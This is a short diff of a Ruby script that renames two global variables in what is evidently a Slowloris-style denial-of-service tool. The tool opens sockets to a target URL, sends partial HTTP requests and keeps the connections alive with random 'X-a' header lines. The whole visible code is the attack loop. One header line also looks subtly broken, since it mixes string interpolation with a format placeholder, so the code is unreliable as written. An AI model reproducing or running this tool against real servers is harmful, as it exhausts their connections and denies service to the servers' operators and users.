@@ -31,7 +31,7 @@ def init_socket(url)
     socket.write(("GET / HTTP/1.1\r\n").encode("utf-8"))
     
     # headers
-    $regular_headers.each { |h|
+    $http_headers.each { |h|
         socket.write("#{h}\r\n".encode("utf-8"))
     }
     
@@ -61,7 +61,7 @@ def init_socket(url)
             puts("Sending keep-alive headers... Socket count: #{$sockets.size}")
             $sockets.each { |s|
                 begin
-                    s.write(("X-a: #{n}\r\n" % { n: $prng.rand(4999)+1 }).encode("utf-8"))
+                    s.write(("X-a: #{n}\r\n" % { n: $random.rand(4999)+1 }).encode("utf-8"))
                 rescue
                     $sockets.delete(s)
                 end
@@ -84,9 +84,9 @@ def init_socket(url)
     end
 
 
-$prng = Random.new(1234)
+$random = Random.new(1234)
 $sockets = [] # my array of sockets
-$regular_headers = [ 
+$http_headers = [ 
     "User-Agent: #{$USER_AGENT}",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 ]
